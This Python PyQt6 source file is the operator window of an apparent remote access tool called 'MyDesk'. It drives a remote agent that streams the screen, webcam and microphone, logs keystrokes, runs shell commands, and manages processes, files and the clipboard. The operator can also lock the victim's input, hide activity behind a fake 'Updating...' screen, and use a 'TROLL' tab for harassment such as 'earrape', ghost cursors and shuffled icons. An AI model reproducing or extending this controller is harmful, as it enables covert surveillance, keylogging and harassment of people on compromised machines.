import sys
import os
import json
import time
import struct
import asyncio
from PyQt6.QtWidgets import (QMainWindow, QToolBar, QMessageBox, QWidget, 
                             QVBoxLayout, QHBoxLayout, QTextEdit, QPushButton,
                             QLabel, QFrame, QToolButton, QTabWidget)
from PyQt6.QtGui import QAction, QPixmap
from PyQt6.QtCore import Qt
import base64

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from viewer.widgets import VideoCanvas, KeyLogWidget
from viewer.session_worker import AsyncSessionWorker
from viewer.webcam_window import WebcamWindow
from viewer.audio_player import AudioPlayer
from viewer.settings_dialog import SettingsDialog
from viewer.curtain_dialog import CurtainDialog
from viewer.connection_dialog import ConnectionDialog
from viewer.shell_tab import ShellTab
from viewer.pm_tab import PMTab
from viewer.fm_tab import FMTab
from viewer.clipboard_tab import ClipboardTab
from viewer.settings_tab import SettingsTab
from viewer.troll_tab import TrollTab
from core import protocol
from core.network import send_msg

SETTINGS_FILE = "capture_settings.json"

class SessionWindow(QMainWindow):
    def __init__(self, target_url, target_id=None):
        super().__init__()
        self.setWindowTitle(f"MyDesk Session - {target_id or target_url}")
        self.resize(1280, 800)
        
        self.capture_settings = self.load_settings()
        self.curtain_active = False
        self.input_mode = "direct"  # "direct" or "indirect"
        self.closing = False
        self.mouse_enabled = True
        self.input_blocked = False
        
        # Mouse Throttling (send every 100ms max = 10 moves/sec)
        self._last_mouse_time = 0
        self._mouse_throttle_ms = 100  # Increased to prevent broker overload
        
        # Main Layout
        main_widget = QWidget()
        main_layout = QVBoxLayout(main_widget)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)
        self.setCentralWidget(main_widget)
        
        # Video Canvas (with curtain overlay)
        self.canvas = VideoCanvas()
        self.canvas.input_signal.connect(self.handle_input)
        
        # Curtain Overlay
        self.curtain_overlay = QLabel(self.canvas)
        self.curtain_overlay.setStyleSheet("background-color: black;")
        self.curtain_overlay.hide()
        self.curtain_overlay.mousePressEvent = lambda e: self.disable_curtain()
        
        # Tabs
        self.tabs = QTabWidget()
        main_layout.addWidget(self.tabs, 1)

        # Screen Tab
        screen_tab = QWidget()
        screen_layout = QVBoxLayout(screen_tab)
        screen_layout.setContentsMargins(0, 0, 0, 0)
        screen_layout.addWidget(self.canvas)
        
        self.tabs.addTab(screen_tab, "Screen")
        
        # Shell Tab
        self.shell_tab = ShellTab()
        self.shell_tab.command_signal.connect(self.send_shell_command)
        self.tabs.addTab(self.shell_tab, "Shell")
        
        # Process Manager Tab
        self.pm_tab = PMTab()
        self.pm_tab.refresh_signal.connect(self.request_process_list)
        self.pm_tab.kill_signal.connect(self.kill_process)
        self.tabs.addTab(self.pm_tab, "Process Manager")
        
        # File Manager Tab
        self.fm_tab = FMTab()
        self.fm_tab.list_signal.connect(self.request_file_list)
        self.fm_tab.download_signal.connect(self.request_file_download)
        self.fm_tab.upload_signal.connect(self.upload_file)
        self.fm_tab.delete_signal.connect(self.delete_file)
        self.fm_tab.mkdir_signal.connect(self.create_dir)
        self.tabs.addTab(self.fm_tab, "File Manager")
        
        # Clipboard Tab
        self.clipboard_tab = ClipboardTab()
        self.clipboard_tab.get_clipboard_signal.connect(self.request_clipboard)
        self.clipboard_tab.set_clipboard_signal.connect(self.set_clipboard)
        self.tabs.addTab(self.clipboard_tab, "Clipboard")
        
        # Device Settings Tab
        self.device_settings_tab = SettingsTab()
        self.device_settings_tab.set_volume_signal.connect(lambda l: self.send_device_setting(protocol.OP_SET_VOLUME, {'level': l}))
        self.device_settings_tab.set_mute_signal.connect(lambda m: self.send_device_setting(protocol.OP_SET_MUTE, {'muted': m}))
        self.device_settings_tab.set_brightness_signal.connect(lambda l: self.send_device_setting(protocol.OP_SET_BRIGHTNESS, {'level': l}))
        self.device_settings_tab.set_time_signal.connect(lambda t: self.send_device_setting(protocol.OP_SET_TIME, {'datetime': t}))
        self.device_settings_tab.sync_time_signal.connect(lambda: self.send_device_setting(protocol.OP_SYNC_TIME, {}))
        self.device_settings_tab.power_action_signal.connect(lambda a: self.send_device_setting(protocol.OP_POWER_ACTION, {'action': a}))
        self.device_settings_tab.get_sysinfo_signal.connect(lambda: self.send_device_setting(protocol.OP_GET_SYSINFO, {}))
        self.tabs.addTab(self.device_settings_tab, "Settings")
        
        # Troll Tab
        self.troll_tab = TrollTab()
        self.troll_tab.open_url_signal.connect(lambda u: self.send_troll(protocol.OP_TROLL_URL, {'url': u}))
        self.troll_tab.play_sound_signal.connect(lambda d: self.send_troll_binary(protocol.OP_TROLL_SOUND, d))
        self.troll_tab.random_sound_signal.connect(lambda e, i: self.send_troll(protocol.OP_TROLL_RANDOM_SOUND, {'enabled': e, 'interval_ms': i}))
        self.troll_tab.alert_loop_signal.connect(lambda e: self.send_troll(protocol.OP_TROLL_ALERT_LOOP, {'enabled': e}))
        self.troll_tab.volume_max_signal.connect(lambda: self.send_troll(protocol.OP_TROLL_VOLUME_MAX, {}))
        self.troll_tab.earrape_signal.connect(lambda: self.send_troll(protocol.OP_TROLL_EARRAPE, {}))
        self.troll_tab.whisper_signal.connect(lambda e: self.send_troll(protocol.OP_TROLL_WHISPER, {'enabled': e}))
        self.troll_tab.play_video_signal.connect(lambda d: self.send_troll_binary(protocol.OP_TROLL_VIDEO, d))
        self.troll_tab.ghost_cursor_signal.connect(lambda e: self.send_troll(protocol.OP_TROLL_GHOST_CURSOR, {'enabled': e}))
        self.troll_tab.shuffle_icons_signal.connect(lambda: self.send_troll(protocol.OP_TROLL_SHUFFLE_ICONS, {}))
        self.troll_tab.wallpaper_signal.connect(lambda d: self.send_troll_binary(protocol.OP_TROLL_WALLPAPER, d))
        self.troll_tab.overlay_signal.connect(lambda t: self.send_troll(protocol.OP_TROLL_OVERLAY, {'type': t}))
        self.troll_tab.stop_all_signal.connect(lambda: self.send_troll(protocol.OP_TROLL_STOP, {}))
        self.tabs.addTab(self.troll_tab, "TROLL")
        
        # Bottom Input Panel
        self.setup_bottom_panel(main_layout)
        
        # KeyLog (separate window now)
        self.keylog_widget = KeyLogWidget()
        self.keylog_widget.setParent(None)  # Detach from main window
        self.keylog_widget.setWindowTitle("Key Log")
        self.keylog_widget.resize(350, 450)
        
        # Webcam Window
        self.webcam_win = WebcamWindow(self)
        self.webcam_win.closed.connect(self.stop_webcam)
        
        # Audio Player
        self.player = AudioPlayer()

        # Toolbar
        self.setup_toolbar()
        
        # Async Worker
        self.worker = AsyncSessionWorker(target_url, target_id)
        self.worker.frame_received.connect(self.canvas.update_frame)
        self.worker.cam_received.connect(self.webcam_win.update_frame)
        self.worker.audio_received.connect(self.player.play_chunk)
        self.worker.log_received.connect(self.keylog_widget.append_log)
        self.worker.connection_lost.connect(self.on_disconnect)
        self.worker.connection_progress.connect(self._on_progress)
        self.worker.connection_ready.connect(self._on_connected)
        self.worker.device_error.connect(self.on_device_error)
        
        # Tab data signals - use default AutoConnection (Qt decides based on thread)
        self.worker.shell_output.connect(self.shell_tab.append_output)
        self.worker.shell_exit.connect(self.shell_tab.show_exit_code)
        self.worker.shell_cwd.connect(self.shell_tab.update_cwd)
        self.worker.pm_data.connect(self.pm_tab.update_data)
        self.worker.fm_data.connect(self.fm_tab.update_data)
        self.worker.clipboard_data.connect(self.clipboard_tab.update_content)
        self.worker.clipboard_history.connect(self.clipboard_tab.update_history)
        self.worker.clipboard_entry.connect(self.clipboard_tab.add_entry)
        self.worker.sysinfo_data.connect(self.device_settings_tab.update_sysinfo)
        
        # Clipboard tab outgoing signals
        self.clipboard_tab.get_history_signal.connect(
            lambda: self.worker.send_msg(bytes([protocol.OP_CLIP_HISTORY_REQ]))
        )
        self.clipboard_tab.delete_entry_signal.connect(
            lambda idx: self.worker.send_msg(
                bytes([protocol.OP_CLIP_DELETE]) + json.dumps({"index": idx}).encode('utf-8')
            )
        )
        self.clipboard_tab.set_consent_signal.connect(
            lambda enabled: self.worker.send_msg(
                bytes([protocol.OP_CLIP_CONSENT]) + json.dumps({"consent": enabled}).encode('utf-8')
            )
        )
        
        # Connection Dialog (blocks until connected)
        self.conn_dialog = ConnectionDialog(target_id or target_url, self)
        self.conn_dialog.cancelled.connect(self.close)
        
        # Disable controls until connected
        self._set_controls_enabled(False)
        
        # Start connection
        self.worker.start_async()
        self.conn_dialog.show()
    
    def _on_progress(self, step, hint):
        """Update connection dialog progress"""
        if hasattr(self, 'conn_dialog') and self.conn_dialog.isVisible():
            self.conn_dialog.set_step(step, hint)
    
    def _on_connected(self):
        """Called when handshake complete"""
        if hasattr(self, 'conn_dialog'):
            self.conn_dialog.set_success()
        self._set_controls_enabled(True)
        
        # Auto-refresh managers
        self.request_process_list()
        self.request_file_list(".")
    
    def _set_controls_enabled(self, enabled):
        """Enable/disable all interactive controls"""
        for action in self.toolbar.actions():
            action.setEnabled(enabled)
        self.canvas.setEnabled(enabled)
        if hasattr(self, 'bottom_panel'):
            self.bottom_panel.setEnabled(enabled)

    def setup_toolbar(self):
        self.toolbar = QToolBar("Controls")
        self.toolbar.setStyleSheet("""
            QToolBar { background-color: #2D2D30; spacing: 5px; padding: 5px; }
            QToolButton { color: white; padding: 5px 10px; }
            QToolButton:checked { background-color: #007ACC; }
        """)
        self.addToolBar(self.toolbar)
        
        # Webcam
        self.act_cam = QAction("📷 Webcam", self, checkable=True)
        self.act_cam.triggered.connect(self.toggle_webcam)
        self.toolbar.addAction(self.act_cam)
        
        # Mic
        self.act_mic = QAction("🎙️ Audio", self, checkable=True)
        self.act_mic.triggered.connect(self.toggle_mic)
        self.toolbar.addAction(self.act_mic)
        
        self.toolbar.addSeparator()
        
        # Key Log (dedicated button)
        self.act_keylog = QAction("⌨️ Key Log", self, checkable=True)
        self.act_keylog.triggered.connect(self.toggle_keylog)
        self.toolbar.addAction(self.act_keylog)
        
        # Curtain
        act_curtain = QAction("🔒 Curtain", self)
        act_curtain.triggered.connect(self.show_curtain_dialog)
        self.toolbar.addAction(act_curtain)
        
        # Block Input
        self.act_block = QAction("🚫 Lock Input", self, checkable=True)
        self.act_block.setToolTip("Block Remote Mouse/Keyboard (Requires Admin on Target)")
        self.act_block.toggled.connect(self.toggle_input_block)
        self.toolbar.addAction(self.act_block)
        
        self.toolbar.addSeparator()
        
        # Settings
        act_settings = QAction("⚙️ Settings", self)
        act_settings.triggered.connect(self.show_settings_dialog)
        self.toolbar.addAction(act_settings)
        
        # Disconnect
        self.toolbar.addSeparator()
        btn_disconnect = QToolButton()
        btn_disconnect.setText("❌ Disconnect")
        btn_disconnect.setStyleSheet("color: #FF5555; font-weight: bold;")
        btn_disconnect.clicked.connect(self.disconnect_session)
        self.toolbar.addWidget(btn_disconnect)

    def setup_bottom_panel(self, parent_layout):
        panel = QFrame()
        panel.setStyleSheet("""
            QFrame { background-color: #252526; border-top: 1px solid #3E3E42; }
            QLabel { color: #CCCCCC; }
            QPushButton { 
                background-color: #3E3E42; 
                color: white; 
                border-radius: 4px; 
                padding: 8px 15px;
            }
            QPushButton:hover { background-color: #505050; }
            QPushButton:checked { background-color: #007ACC; }
            QTextEdit { 
                background-color: #1E1E1E; 
                color: white; 
                border: 1px solid #3E3E42;
                border-radius: 4px;
            }
        """)
        panel_layout = QVBoxLayout(panel)
        panel_layout.setContentsMargins(10, 10, 10, 10)
        
        # Controls Row
        controls_row = QHBoxLayout()
        
        # Input Mode Buttons
        mode_label = QLabel("Input:")
        controls_row.addWidget(mode_label)
        
        self.btn_direct = QPushButton("Direct")
        self.btn_direct.setCheckable(True)
        self.btn_direct.setChecked(True)
        self.btn_direct.clicked.connect(lambda: self.set_input_mode("direct"))
        controls_row.addWidget(self.btn_direct)
        
        self.btn_indirect = QPushButton("Buffered")
        self.btn_indirect.setCheckable(True)
        self.btn_indirect.clicked.connect(lambda: self.set_input_mode("indirect"))
        controls_row.addWidget(self.btn_indirect)
        
        controls_row.addSpacing(20)
        
        # Mouse Toggle
        self.btn_mouse = QPushButton("🖱️ Mouse: ON")
        self.btn_mouse.setCheckable(True)
        self.btn_mouse.setChecked(True)
        self.btn_mouse.clicked.connect(self.toggle_mouse)
        controls_row.addWidget(self.btn_mouse)
        
        controls_row.addStretch()
        panel_layout.addLayout(controls_row)
        
        # Input Buffer Row (Visible only in Indirect Mode)
        self.buffer_frame = QFrame()
        buffer_layout = QHBoxLayout(self.buffer_frame)
        buffer_layout.setContentsMargins(0, 0, 0, 0)
        
        self.input_buffer = QTextEdit()
        self.input_buffer.setPlaceholderText("Type keys to buffer (e.g. Hello World)...")
        self.input_buffer.setMaximumHeight(60)
        buffer_layout.addWidget(self.input_buffer, 1)
        
        btn_clear = QPushButton("Clear")
        btn_clear.clicked.connect(self.input_buffer.clear)
        buffer_layout.addWidget(btn_clear)
        
        btn_send = QPushButton("Send")
        btn_send.setStyleSheet("background-color: #007ACC;")
        btn_send.clicked.connect(self.send_buffer)
        buffer_layout.addWidget(btn_send)
        
        panel_layout.addWidget(self.buffer_frame)
        
        # Initialize visibility
        self.set_input_mode("direct")
        parent_layout.addWidget(panel)
    
    def set_input_mode(self, mode):
        self.input_mode = mode
        self.btn_direct.setChecked(mode == "direct")
        self.btn_indirect.setChecked(mode == "indirect")
        
        # Dynamic Visibility
        if hasattr(self, 'buffer_frame'):
            self.buffer_frame.setVisible(mode == "indirect")
    
    def set_cursor_blocked(self, blocked):
        """Set cursor to forbidden if blocked."""
        if blocked:
            self.canvas.setCursor(Qt.CursorShape.ForbiddenCursor)
        else:
            self.canvas.setCursor(Qt.CursorShape.ArrowCursor)

    def toggle_mouse(self):
        self.mouse_enabled = self.btn_mouse.isChecked()
        self.btn_mouse.setText(f"🖱️ Mouse: {'ON' if self.mouse_enabled else 'OFF'}")
    
    def send_buffer(self):
        text = self.input_buffer.toPlainText()
        if text and self.worker.is_connected():
            self.send_command(protocol.OP_KEY_BUFFER, text.encode('utf-8'))
            self.input_buffer.clear()
    
    def handle_input(self, event):
        """Handle input from canvas"""
        if self.curtain_active or self.input_blocked:
            return
        if not self.worker.is_connected():
            return
        
        event_type = event[0]
        
        if event_type == 'move' and self.mouse_enabled:
            # Throttle mouse moves (max 20/sec)
            now = time.time() * 1000
            if now - self._last_mouse_time < self._mouse_throttle_ms:
                return
            self._last_mouse_time = now
            
            x, y = event[1], event[2]
            payload = struct.pack('!ff', x, y)
            self.send_command(protocol.OP_MOUSE_MOVE, payload)
            
        elif event_type == 'click' and self.mouse_enabled:
            try:
                button_obj, pressed = event[1], event[2]
                # Map Qt MouseButton to int (1=left, 2=right, 4=middle)
                btn_map = {1: 1, 2: 2, 4: 4}  # Qt MouseButton.value values
                btn_value = button_obj.value if hasattr(button_obj, 'value') else 1
                button = btn_map.get(btn_value, 1)
                payload = bytes([button, 1 if pressed else 0])
                self.send_command(protocol.OP_MOUSE_CLICK, payload)
            except Exception as e:
                print(f"[-] Click error: {e}")
            
        elif event_type == 'key' and self.input_mode == "direct":
            key_code, pressed = event[1], event[2]
            payload = struct.pack('!I', key_code) + bytes([1 if pressed else 0])
            self.send_command(protocol.OP_KEY_PRESS, payload)
            
        elif event_type == 'scroll' and self.mouse_enabled:
            dx, dy = int(event[1]), int(event[2])
            # Debug assertion/logging for protocol overflow
            if not (-100 <= dx <= 100) or not (-100 <= dy <= 100):
                # We expect small step counts here (e.g. +/- 20). Large values indicate an issue.
                print(f"[!] Warning: Large Scroll Delta Detected: dx={dx}, dy={dy}")

            # Clamp to int16 (Protocol Safety)
            dx = max(-32768, min(32767, dx))
            dy = max(-32768, min(32767, dy))
            payload = struct.pack('!hh', dx, dy)
            self.send_command(protocol.OP_SCROLL, payload)

    def toggle_keylog(self, checked):
        if checked:
            self.keylog_widget.show()
            self.keylog_widget.raise_()
        else:
            self.keylog_widget.hide()

    def toggle_webcam(self, checked):
        if not self.worker.is_connected():
            self.act_cam.setChecked(False)
            QMessageBox.warning(self, "No Connection", "Not connected to agent.")
            return
        
        if checked:
            self.webcam_win.show()
            self.send_command(protocol.OP_CAM_START)
        else:
            self.webcam_win.hide()
            self.send_command(protocol.OP_CAM_STOP)
            
    def stop_webcam(self):
        self.act_cam.setChecked(False)
        if self.worker.is_connected():
            self.send_command(protocol.OP_CAM_STOP)

    def toggle_mic(self, checked):
        if not self.worker.is_connected():
            self.act_mic.setChecked(not checked)
            QMessageBox.warning(self, "No Connection", "Not connected to agent.")
            return
        
        if checked:
            if self.player.start():
                self.send_command(protocol.OP_MIC_START)
            else:
                self.act_mic.setChecked(False)
        else:
            self.player.stop()
            self.send_command(protocol.OP_MIC_STOP)

    def show_curtain_dialog(self):
        dialog = CurtainDialog(self)
        dialog.curtain_selected.connect(self.activate_curtain)
        dialog.exec()
    
    def activate_curtain(self, curtain_type, data):
        self.curtain_active = True
        self.curtain_overlay.setGeometry(self.canvas.rect())
        
        if curtain_type == "BLACK":
            self.curtain_overlay.setStyleSheet("background-color: black;")
            self.curtain_overlay.setPixmap(QPixmap())
            # Send command to Agent to black out their screen
            self.send_command(protocol.OP_CURTAIN_ON, b"BLACK")
        elif curtain_type == "FAKE_UPDATE":
            self.curtain_overlay.setText("↻ Updating...")
            self.curtain_overlay.setAlignment(Qt.AlignmentFlag.AlignCenter)
            self.curtain_overlay.setStyleSheet("background-color: #006dae; color: white; font-size: 24px;")
            self.send_command(protocol.OP_CURTAIN_ON, b"FAKE_UPDATE")
        else:  # IMAGE
            pixmap = QPixmap(data)
            self.curtain_overlay.setPixmap(pixmap.scaled(
                self.canvas.size(), 
                Qt.AspectRatioMode.KeepAspectRatioByExpanding
            ))
            # Send command to Agent (just black for now, can't send image)
            self.send_command(protocol.OP_CURTAIN_ON, b"BLACK")
        
        self.curtain_overlay.show()
        self.curtain_overlay.raise_()
    
    def disable_curtain(self):
        self.curtain_active = False
        self.curtain_overlay.hide()
        # Send command to Agent to restore their screen
        self.send_command(protocol.OP_CURTAIN_OFF)
    
    def show_settings_dialog(self):
        dialog = SettingsDialog(self, self.capture_settings)
        dialog.settings_saved.connect(self.apply_settings)
        dialog.exec()
    
    def apply_settings(self, settings):
        self.capture_settings = settings
        self.save_settings()
        # Send to agent using msgpack (binary, smaller than JSON)
        if self.worker.is_connected():
            try:
                import msgpack
                payload = msgpack.packb(settings)
            except ImportError:
                # Fallback to JSON if msgpack not available
                payload = json.dumps(settings).encode()
            self.send_command(protocol.OP_SETTINGS, payload)
    
    def load_settings(self):
        if os.path.exists(SETTINGS_FILE):
            try:
                with open(SETTINGS_FILE, 'r') as f:
                    return json.load(f)
            except Exception:
                pass
        return {"method": "MSS", "quality": 50, "scale": 90, "format": "JPEG"}
    
    def save_settings(self):
        with open(SETTINGS_FILE, 'w') as f:
            json.dump(self.capture_settings, f)

    def send_command(self, opcode, payload=b''):
        try:
            if self.worker.loop and self.worker.ws:
                asyncio.run_coroutine_threadsafe(
                    send_msg(self.worker.ws, bytes([opcode]) + payload), 
                    self.worker.loop
                )
        except Exception as e:
            print(f"[-] Send command error: {e}")
    
    # =========================================================================
    # Shell Tab Handlers
    # =========================================================================
    
    def send_shell_command(self, shell_type, cmd):
        """Send shell command to agent."""
        payload = json.dumps({'shell': shell_type, 'cmd': cmd}).encode('utf-8')
        self.send_command(protocol.OP_SHELL_EXEC, payload)
    
    # =========================================================================
    # Process Manager Tab Handlers
    # =========================================================================
    
    def request_process_list(self):
        """Request process list from agent."""
        self.send_command(protocol.OP_PM_LIST)
    
    def kill_process(self, pid):
        """Kill process on agent."""
        payload = json.dumps({'pid': pid}).encode('utf-8')
        self.send_command(protocol.OP_PM_KILL, payload)
    
    # =========================================================================
    # File Manager Tab Handlers
    # =========================================================================
    
    def request_file_list(self, path):
        """Request file list from agent."""
        payload = json.dumps({'path': path}).encode('utf-8')
        self.send_command(protocol.OP_FM_LIST, payload)
    
    def request_file_download(self, path):
        """Request file download from agent."""
        payload = json.dumps({'path': path}).encode('utf-8')
        self.send_command(protocol.OP_FM_DOWNLOAD, payload)
    
    def upload_file(self, remote_path, data):
        """Upload file to agent."""
        payload = json.dumps({
            'path': remote_path,
            'data': base64.b64encode(data).decode('ascii')
        }).encode('utf-8')
        self.send_command(protocol.OP_FM_UPLOAD, payload)
    
    def delete_file(self, path):
        """Delete file on agent."""
        payload = json.dumps({'path': path}).encode('utf-8')
        self.send_command(protocol.OP_FM_DELETE, payload)
    
    def create_dir(self, path):
        """Create directory on agent."""
        payload = json.dumps({'path': path}).encode('utf-8')
        self.send_command(protocol.OP_FM_MKDIR, payload)
    
    # =========================================================================
    # Clipboard Tab Handlers
    # =========================================================================
    
    def request_clipboard(self):
        """Request clipboard content from agent."""
        self.send_command(protocol.OP_CLIP_GET)
    
    def set_clipboard(self, text):
        """Set clipboard on agent."""
        self.send_command(protocol.OP_CLIP_SET, text.encode('utf-8'))
    
    # =========================================================================
    # Device Settings Tab Handlers
    # =========================================================================
    
    def send_device_setting(self, opcode, data):
        """Send device setting command to agent."""
        payload = json.dumps(data).encode('utf-8') if data else b''
        self.send_command(opcode, payload)
    
    # =========================================================================
    # Troll Tab Handlers
    # =========================================================================
    
    def send_troll(self, opcode, data):
        """Send troll command to agent (JSON payload)."""
        payload = json.dumps(data).encode('utf-8') if data else b''
        self.send_command(opcode, payload)
    
    def send_troll_binary(self, opcode, data):
        """Send troll command with binary payload (sound/video/image)."""
        self.send_command(opcode, data)

    def disconnect_session(self):
        """User manually clicked disconnect"""
        self.closing = True
        self.close()

    def on_device_error(self, device_type, error_msg):
        """Handle device errors (cam/mic failed to start)"""
        print(f"[!] Device Error: {device_type} - {error_msg}")
        
        if device_type == "CAM":
            # Turn off the cam toggle
            self.act_cam.setChecked(False)
            self.webcam_win.setWindowTitle(f"Remote Webcam - ERROR: {error_msg}")
            self.webcam_win.close()
            QMessageBox.warning(self, "Webcam Error", f"Remote webcam failed:\n{error_msg}")
        elif device_type == "MIC":
            # Turn off the mic toggle
            self.act_mic.setChecked(False)
            QMessageBox.warning(self, "Microphone Error", f"Remote microphone failed:\n{error_msg}")

    def on_disconnect(self):
        if self.closing:
            return

        # Close connection dialog if still visible
        if hasattr(self, 'conn_dialog') and self.conn_dialog.isVisible():
            self.conn_dialog.set_error("Connection lost")
            self.conn_dialog.close()
        else:
            # Only show message box if dialog wasn't visible
            QMessageBox.critical(self, "Disconnected", "Connection lost.")
        self.close()
    
    def resizeEvent(self, event):
        super().resizeEvent(event)
        if self.curtain_active:
            self.curtain_overlay.setGeometry(self.canvas.rect())
    
    def closeEvent(self, event):
        self.closing = True
        self.worker.stop()
        self.player.stop()
        self.keylog_widget.close()
        super().closeEvent(event)
